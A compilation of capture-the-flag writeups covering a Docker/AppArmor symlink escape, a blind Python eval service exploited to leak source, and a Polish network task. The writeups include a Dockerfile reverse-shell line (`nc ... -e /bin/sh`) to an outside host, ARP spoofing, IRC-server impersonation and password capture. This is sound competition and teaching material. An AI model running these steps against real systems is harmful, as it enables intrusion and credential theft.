<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-disconnect3d
description: CTF writeups and security challenges by disconnect3d.
---

# Writeups by disconnect3d

Source repository: `/repos/disconnect3d`

## Repository Index

- writeups/README.md
- writeups/dsctf2020-apparmor2-task/README.md
- writeups/isitdtu_ctf_quals_2018/xoxopwn.md
- writeups/tamuctf/altf4/solution.md

## Writeup Content


### File: writeups/README.md

# Writeups

## TAMUCTF 2019 - https://ctftime.org/event/740
* [(PWN) pwn6 - exploit client/server app](tamuctf/pwn6/solve.py)
* [(NETWORK) alt-f4](tamuctf/altf4/solution.md) (in polish, not a production-grade writeup)

### ISITDTU CTF quals 2018
* [(PWN) babyformat - just a solving script *for a local libc*](isitdtu_ctf_quals_2018/babyformat/solve.py)
* [(PWN) xoxopwn - Python eval pwn](isitdtu_ctf_quals_2018/xoxopwn.md)
* [(PWN) dead\_note\_lv1 - just a solving script, with explanations](isitdtu_ctf_quals_2018/dead_note_lv1/solve.py)


## Wargamez

### pwnable.kr
* [(PWN) unlink](pwnable.kr/unlink/solve.py)



### File: writeups/dsctf2020-apparmor2-task/README.md

### Writeup for the AppArmor2 task from Dragon Sector CTF 2020
This is a very short writeup to the "AppArmor2" challenge from the [Dragon Sector CTF 2020](https://ctftime.org/event/1082), solved by disconnect3d from justCatTheFish ctf team.

In this CTF challenge, there was a custom AppArmor policy applied to the run containers, such that it disallowed reads/writes to `/flag-*` paths.

We, as a user, could only provide a docker image that was built and run later on, and the flag (which we wanted to steal) was mounted as a volume into the run container with a `docker run -v /flag.txt:/flag-XXYY ...` invocation. The `XXYY` part was random.

### Solution

The solver is in `./solve.sh`. When running for first time, you need to:
* update the (referenced) docker image name in `build.sh` and the `<<YOURIP>>` part
* login to gitlab docker registry (`docker login`) and share your project with `dragonsectorclient` (that's how you shared the docker image with the challenge, and the challenge pulled and run it later on)

The *bug* here is that AppArmor denies read/write/etc to `/flag-*` but this limitation is enforced during container run time **but not during its build time AND that Docker will follow symlinks present in the image when mounting files with `docker run -v /hostpath:/containerpath ...`**.

So it turns out that when the `docker run -v something:somepath ...` is invoked, the `somepath` follows links and we can make a link from `/flag-XXYY` to `/D` in our image. In the end, the `docker run -v /flag.txt:/flag-XXYY ...` will mount `flag.txt` into `/D` which we can read.

```
dc@jhtc:~/dsctf/x/task/ds-apparmor-task/solution$ ./solve.sh
mkdir: cannot create directory ‘rootfs’: File exists
Sending build context to Docker daemon  33.56MB
Step 1/4 : FROM ubuntu
 ---> d70eaf7277ea
Step 2/4 : RUN apt update && apt install -y netcat-traditional
 ---> Using cache
 ---> 40ac85e97bbe
Step 3/4 : ADD rootfs /
 ---> Using cache
 ---> 17f203a1ee6a
Step 4/4 : CMD nc 51.38.138.162 4444 -e /bin/sh
 ---> Using cache
 ---> 422aece7a145
Successfully built 422aece7a145
Successfully tagged registry.gitlab.com/mytempaccount123/test:latest
The push refers to repository [registry.gitlab.com/mytempaccount123/test]
3c45abc528a8: Layer already exists
be0923227e77: Layer already exists
cc9d18e90faa: Layer already exists
0c2689e3f920: Layer already exists
47dde53750b4: Layer already exists
latest: digest: sha256:fda92fc789dbfde33799502d18e30e8f3b2d184d9942ea1e6c5ff75f7003ffd5 size: 1365
[+] Opening connection to apparmor2.hackable.software on port 1337: Done
Executing b'hashcash -mb26 udqynihh'
out b'1:26:201121:udqynihh::i6HwB+Gk4OttOKvq:000000005+DgO\n'
b'Image added to the queue\n'
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 156.95.107.34.bc.googleusercontent.com 56178 received!
DrgnS{4e77cd33ffb0c7802b39303f7452fd90}
```



### File: writeups/isitdtu_ctf_quals_2018/xoxopwn.md

# The task

* category: pwn
* points: 608
* name: xoxopwn

In the description we had just the remote addresses.

## Solution

This was blind task, we just had the remote address.

So first, we just connect and see how the server behaves on given inputs:

```
$ nc -v 178.128.12.234 10002
Connection to 178.128.12.234 10002 port [tcp/*] succeeded!
This is function x()>>> 1+1
2

$ nc -v 178.128.12.234 10002
Connection to 178.128.12.234 10002 port [tcp/*] succeeded!
This is function x()>>> 'xyz'
xyz

$ nc -v 178.128.12.234 10002
Connection to 178.128.12.234 10002 port [tcp/*] succeeded!
This is function x()>>> __file__
/home/xoxopwn/xoxopwn.py
```

From that, we can assume its a Python `eval` under the hood, because it returns expressions, strings and special symbols (e.g. `__file__`).

### Lets grab source code

```
nc -v 178.128.12.234 10002


Connection to 178.128.12.234 10002 port [tcp/*] succeeded!
This is function x()>>> open(__file__).read()
import socket
import threading
import SocketServer

host, port = '0.0.0.0', 9999

def o(a):
	secret = "392a3d3c2b3a22125d58595733031c0c070a043a071a37081d300b1d1f0b09"
	secret = secret.decode("hex")
	key = "pythonwillhelpyouopenthedoor"
	ret = ""
	for i in xrange(len(a)):
		ret += chr(ord(a[i])^ord(key[i%len(a)]))
	if ret == secret:
		print "Open the door"
	else:
		print "Close the door"


def x(a):
	xxx = "finding secret in o()"
	if len(a)>21:
		return "Big size ~"
	#print "[*] ",a
	return eval(a)

class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    allow_reuse_address = True

class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):
    def handle(self):
    	self.request.sendall("This is function x()")
        self.request.sendall(">>> ")
        self.data = self.request.recv(1024).strip()
        print "{} wrote: {}".format(self.client_address[0],self.data)
        ret = x(str(self.data))
        self.request.sendall(str(ret))

if __name__ == "__main__":
	serverthuong123 = ThreadedTCPServer((host, port), ThreadedTCPRequestHandler)
	server_thread = threading.Thread(target=serverthuong123.serve_forever)
	server_thread.daemon = True
	server_thread.start()
	print "Server loop running in thread:", server_thread.name
	server_thread.join()
```

### Solve

The flag is probably hidden in the `o` function and so we have to reverse it. This can be done in IPython session:

```
In [1]: secret = "392a3d3c2b3a22125d58595733031c0c070a043a071a37081d300b1d1f0b09"
   ...: secret = secret.decode("hex")
   ...: key = "pythonwillhelpyouopenthedoor"
   ...: 
   ...: a = secret
   ...: 
   ...: ret = ""
   ...: for i in xrange(len(a)):
   ...:     ret += chr(ord(a[i])^ord(key[i%len(key)]))
   ...:     

In [2]: ret
Out[2]: 'ISITDTU{1412_secret_in_my_door}'
```
```



### File: writeups/tamuctf/altf4/solution.md

# Alt-f4 task writeup [Polish]

**NOTE: This was written just for my friends and I didn't have time to polish it, so it is in polish language :P**

### TLDR task info
TLDR:
Nasz ip: 172.30.0.14 (w vpn)

Sa dwa routery:
- 172.30.0.1 - tu my jestesmy podlaczeni oraz bot imp3ac33 czy jakos tak (172.30.0.2 chyba)
- 172.30.20.1 - ten router jest podlaczony do 172.30.0.1 oraz ma w swojej sieci: serwer irca (172.30.20.10), admina irca - lordbaal (172.30.20.2), ktory w /whois widac ze siedzi na kanale #sanctum (gdzie jest flaga) oraz bota impac66 ktory ma ip 172.30.20.3

### Solution
1. Robimyarp spoofing na 172.30.0.1 oraz 172.30.0.2 - bo tylko te hosty widac w naszej sieci (na przyklad przez ettercap)
- dzieki temu wiemy ze istnieje serwer irca na 172.30.20.10, bo bot 172.30.0.2 sie z nim laczy
- nie znamy hasla do irca, ale przez to ze robimy arp spoofing bot 172.30.0.2 rozlacza sie z irca i probuje polaczyc sie ponownie wysylajac haslo `underling`
- na ircu widzimy komunikacje C&C: to znnaczy admin - lordbaal wysyla komendy do impac66 i imp3ac33 - w ten sposob: `+impac66, payload http://172.30.0.2:8000/stats` - i jednoczesnie ten lordbaal hostuje u siebie serwer http gdzie hostuje dla nich payloady
- nie ma zadnych ACL/podpisow payloadow wiec mozemy zrobic reverse shella z obu botow na siebie
- na botach nie ma nic ciekawego

2. Na botach mamy dostep do konfiguracji sieci przez polecenie `ip`

3. Robimy 2 reverse shelle na impac66 (172.30.20.2), dodajemy sobie adres ip irca do interfejsu sieciowego przez `ip addr add 172.30.20.10 dev eth0`; w drugim shellu odpalamy netcata `nc -l -vvv -p 6667` - chcemy "byc serwerem irca" i zrobic zeby baal sie z nami polaczyl

4. Na te chwile mamy taki sam adres ip jak serwer irca ale nikt w sieci o tym nie wie, a w szczegolnosci nie baal

5. impac66 rozlaczy sie wtedy sam z irca, bo wysyla wiadomosci sam do siebie - wznowi wtedy polaczenie do siebie do irca wiec w drugim shellu z nc zobaczymy to polaczenie, musimy je zabic z pierszego shella przez `kill -9 $(pidof nc)` i odpalic na nowo nc

6. Zeby baal laczyl sie do nas a nie do prawdziwego shella robimy arp spoofing poprzez ping: `ping -c 10 -I 172.30.20.10 172.30.20.2` - uwaga `-c 10` dajemy po to zeby wyslac 10 pakietow, a `-I 172.30.20.10` zeby ping wysylal pakiety ICMP z tego adresu ip (podszywamy sie pod serwer irca - zatruwamy tablice arp u baala)

7. jak dobrze trafimy (ewentualnie zabijajac nc jeszcze pare razy i odpalajac na nowo) to baal polaczy sie z nami i wysle nam swoje "uprzywilejowane" haslo irca

8. tutaj usuwamy z impac66 (172.30.20.2) dodatkowy adres ip (172.30.20.10) - przestajemy sie podszywac pod irca i od siebie wchodzimy na serwer irca z nowym haslem (od baala) i wbijamy na #sanctum i mamy flage

